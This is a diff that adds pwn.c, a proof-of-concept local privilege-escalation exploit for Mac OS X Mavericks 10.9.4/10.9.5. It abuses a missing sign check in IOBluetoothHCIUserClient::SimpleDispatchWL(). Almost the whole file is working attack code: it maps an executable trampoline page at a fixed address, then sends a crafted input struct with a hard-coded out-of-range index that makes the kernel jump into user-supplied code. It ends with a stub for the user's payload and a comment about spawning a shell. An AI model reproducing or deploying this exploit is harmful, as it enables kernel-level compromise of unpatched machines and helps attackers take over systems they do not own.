@@ -1,0 +1,92 @@
+/*
+ * pwn.c, by @rpaleari and @joystick
+ *
+ * This PoC exploits a missing sign check in
+ * IOBluetoothHCIUserClient::SimpleDispatchWL().
+ *
+ * Tested on  Mac OS X Mavericks (10.9.4/10.9.5).
+ *
+ * Compile with: gcc -Wall -o pwn{,.c} -framework IOKit
+ * 
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+
+#include <IOKit/IOKitLib.h>
+
+uint64_t payload() {
+  /* Your payload goes here. */
+}
+
+int main(void) {
+  /* Map our landing page (kernel will jump at tgt+7) */
+  vm_address_t tgt = 0x0000048800000000; 
+  vm_allocate(mach_task_self(), &tgt, 0x1000, 0);
+  vm_protect(mach_task_self(), tgt, 0x1000, 0,
+	     VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE);
+  memset((void *)tgt, 0, 0x1000);
+
+  /* Prepare payload */
+  char *target = (char *)tgt;
+  
+  /* mov rax, payload */
+  target[7] = 0x48;
+  target[8] = 0xb8;
+  *((uint64_t *)(&target[9])) = (uint64_t) payload;
+  
+  /* jmp rax */
+  target[17] = 0xff;
+  target[18] = 0xe0;
+
+  printf(" [+] Payload function  @ %016llx\n", (uint64_t) payload);
+  printf(" [+] Stored trampoline @ %016llx\n", (uint64_t) tgt+7);
+
+  /* Find the vulnerable service */
+  io_service_t service =
+    IOServiceGetMatchingService(kIOMasterPortDefault,
+				IOServiceMatching("IOBluetoothHCIController"));
+  
+  if (!service) {
+    return -1;
+  }
+
+  /* Connect to the vulnerable service */
+  io_connect_t port = (io_connect_t) 0;
+  kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
+  IOObjectRelease(service);
+  if (kr != kIOReturnSuccess) {
+    return kr;
+  }
+
+  printf(" [+] Opened connection to service on port: %d\n", port);
+
+  /* The first 8 bytes must be 0, so we don't have to handle following
+     parameters */
+  char a[] = "\x00\x00\x00\x00\x00\x00\x00\x00" 
+    /* Don't really matter for the exploit (ignored due to the 0s above) */
+    "\x00\x00\x00\x00\x00\x00\x00\x07\x02\x00\x00\x00\x11\x0a\x00\x00\x03\x72\x00\x00"
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\xfa\x2a\x54\xff\x7f\x00\x00\x78\x00\x00\x00"
+    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    "\xa8\xfb\x2a\x54\xff\x7f\x00\x00\xd8\xfa\x2a\x54\xff\x7f\x00\x00\x60\x4a\xb6\x86"
+    "\x80\xff\xff\xff"
+    /* Index value 0xfff5b6a8 makes _sRoutines[index] point to an in-kernel
+       memory area that contains {0x0000048800000007, N}, with 0 <= N < 8. May
+       need to be adjusted on other Mavericks versions. */
+    "\xa8\xb6\xf5\xff\x80\xff\xff\xff"; 
+  
+  printf(" [+] Launching exploit!\n");
+  kr = IOConnectCallMethod((mach_port_t) port,      /* Connection      */
+                           (uint32_t) 0,            /* Selector        */
+                           NULL, 0,                 /* input, inputCnt */
+                           (const void*) a,         /* inputStruct     */
+                           sizeof(a),               /* inputStructCnt  */
+                           NULL, NULL, NULL, NULL); /* Output stuff    */
+
+  /* Exec shell here after payload returns */
+  
+  return IOServiceClose(port);
+}
